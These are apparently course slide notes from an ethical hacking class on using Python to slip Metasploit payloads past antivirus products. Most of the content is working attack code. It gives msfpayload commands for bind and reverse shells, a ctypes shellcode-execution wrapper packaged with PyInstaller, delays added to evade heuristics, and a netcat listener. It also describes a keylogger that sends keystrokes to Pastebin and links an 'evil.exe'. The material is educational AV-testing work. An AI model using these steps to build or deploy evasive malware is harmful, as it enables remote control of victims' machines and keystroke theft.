### Violent Python: Advanced Ethical Hacking

**Date:** Friday, August 8, 2015  
**Time:** 9:01 AM  
**Instructor:** Sam Bowne  
**Institution:** City College San Francisco  
**Resources:** Slides and projects available at [samsclass.info](http://samsclass.info)

---

#### Course Overview: CNIT 124 - Advanced Ethical Hacking

**Module: Violent Python**

- **Good Coding Principles:**
  - Exception handling
  - Modular design
  - Optimization
  - Commenting
  - Flowcharts

- **Important Note:** For the purposes of this course, we will often disregard these principles. As ethical hackers, our goal is to break things, and we aim to make it as fast and easy as possible for even a complete novice to write a simple script that can perform an interesting or useful task.

---

#### Projects

- **Antivirus Evasion**
  - **Unleash Your Inner Hacker...**
  - **What Is It Good For?**
    - Watch Mikko Hypponen's video on the topic.
  - **Metasploit Payloads**
    - Metasploit offers hundreds of payloads.
    - The simplest one is `bind_tcp`, which listens on a TCP port for commands.

- **Simple Reverse Shell**
  - A single command can generate a very simple Windows EXE malware.
  - **Antivirus Detection:**
    - Norton identifies the Metasploit payload.
    - VirusTotal: 37/49 detections.

---

#### How to Become 007: Python vs. Antivirus

**Round 1: shell_bind_tcp**

- **Steps:**
  1. Export Metasploit payloads to C code.
  2 - Use the `ctypes` Python library.
  3. Compile the code on Windows.
  4. Install the following in order:
     - Python 2.7
     - PyWin32
     - pip-win
     - PyInstaller
  5. This creates an EXE file that listens on a TCP port.

- **Demo:**
  - On Kali:
    ```bash
    msfpayload windows/shell_bind_tcp C > foo
    nano foo
    ```
  - Modify the top of the file:
    ```python
    from ctypes import *
    shellcode = (
    ```
  - Modify the bottom of the file:
    ```python
    );
    memorywithshell = create_string_buffer(shellcode, len(shellcode))
    shell = cast(memorywithshell, CFUNCTYPE(c_void_p))
    shell()
    ```

- **On Windows (in pip-win):**
  ```bash
  venv -c -i pyi-env-name
  pyinstaller --onefile --noconsole foo
  ```

- **VirusTotal: 1/50 detection**

- **Norton Support:**
  - I tweeted about this, and @NortonSupport replied.
  - VirusTotal is not a fair test because real installed Norton uses Heuristic Scanning.
  - @NortonSupport provided a link for a 30-day trial version.

- **Results:**
  - Norton and Kaspersky detect the payload.
  - Avast! does not detect it.

---

#### Round 2: shell_bind_tcp with a Delay

- **Steps:**
  - On Kali:
    ```bash
    cp foo foo2
    nano foo2
    x=raw_input("Press Enter to continue")
    ```

- **On Windows (in pip-win):**
  ```bash
  venv -c -i pyi-env-name
  pyinstaller --onefile foo2
  ```

- **Results:**
  - Norton, Avast, and MSE fail to detect it.
  - Kaspersky detects it as `HEUR:Trojan.Win32.Generic`.

---

#### Round 3: shell_bind_tcp in Two Stages (No Delay)

- **Testing:**
  - Tested on March 24, 2014, with a two-stage reverse shell and no time delay.
  - Failed AVs:
    - Norton
    - Nod32
    - Avast!
    - 360 Internet Security
    - McAfee
    - Kaspersky

- **Mikko's Reminder:**
  - F-Secure wins!

- **AV Challenge:**
  - Posted on April 3, 2014.
  - No reply from AV vendors, but Norton improved its detection after that.
  - Now, a delay is required.

---

#### Round 4: shell_bind_tcp with a Delay

- **Instructions:**
  - On Kali:
    ```bash
    msfpayload windows/shell_reverse_tcp LHOST=192.168.119.252 C > rev
    nano rev
    ```
  - Modify the top of the file:
    ```python
    x=raw_input("Press Enter to continue")
    from ctypes import *
    shellcode = (
    ```
  - Modify the bottom of the file:
    ```python
    );
    memorywithshell = create_string_buffer(shellcode, len(shellcode))
    shell = cast(memorywithshell, CFUNCTYPE(c_void_p))
    shell()
    ```

- **On Windows (in pip-win):**
  ```bash
  venv -c -i pyi-env-name
  pyinstaller --onefile rev
  ```

- **On Kali:**
  ```bash
  nc â€“lp 4444
  ```

- **Results:**
  - Norton fails.
  - Kaspersky wins.

---

#### Advanced Malware Protection

- **Feedback from Chris Abdalla_1 from HP ESP TippingPoint:**
  - A friend in the financial industry tested `Evil.exe` on a system protected by FireEye.
  - FireEye gives no alerts and allows it to post keystrokes to Pastebin.

- **Python Keylogger:**
  - Google "Python Keylogger" for more information.
  - I used a keylogger from 4 years ago.
  - Post keystrokes to Pastebin.

- **Problem:**
  - Pastebin blocked me for making too many pastes in a 24-hour period.
  - So, I wrote my own Pastebin imitation.

- **Results:**
  - Kaspersky and Avast! lose.
  - Norton wins, but just add a delay...
  - F-Secure loses.

---

#### Product Announcement: Ultra-Advanced APT Tool

- **Download Link:** [samsclass.info/evil.exe](http://samsclass.info/evil.exe)
- **Features:**
  - None of the following products stop it:
    - Norton
    - McAfee
    - Kaspersky
    - Nod32
    - F-Secure
    - Avast!
    - Microsoft Security Essentials

---

This document provides a detailed overview of the course content, including the steps and results of various experiments and projects.